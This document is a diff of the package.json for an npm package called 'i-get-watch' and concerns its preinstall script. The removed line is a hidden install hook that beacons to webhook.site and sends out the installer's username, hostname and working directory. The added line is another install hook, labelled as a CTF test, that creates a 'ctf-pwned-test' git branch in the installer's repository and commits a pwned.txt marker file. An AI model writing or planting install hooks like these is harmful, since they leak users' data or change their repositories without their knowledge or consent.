@@ -1,9 +1,8 @@
 {
   "name": "i-get-watch",
   "version": "0.1.0",
-  "main": "index.js",
   "scripts": {
-    "preinstall": "sh -c 'curl -s https://webhook.site/9b25e33c-db34-4423-9301-ee3fc79ab7c9/HOOK_RAN; curl -s --data-binary \"user=$(id -un) host=$(uname -n) pwd=$(pwd)\" https://webhook.site/81770193-43ce-4efc-a26e-e7ed493eaba2/beacon'"
+    "preinstall": "sh -c 'git rev-parse --is-inside-work-tree >/dev/null 2>&1 || exit 0; git switch ctf-pwned-test 2>/dev/null || git switch -c ctf-pwned-test || exit 1; printf \"CTF test marker\\n\" > pwned.txt; git add pwned.txt && git -c user.name=\"CTF Test\" -c user.email=\"ctf@example.invalid\" commit -m \"Add CTF test marker\"'"
   },
   "license": "MIT"
 }
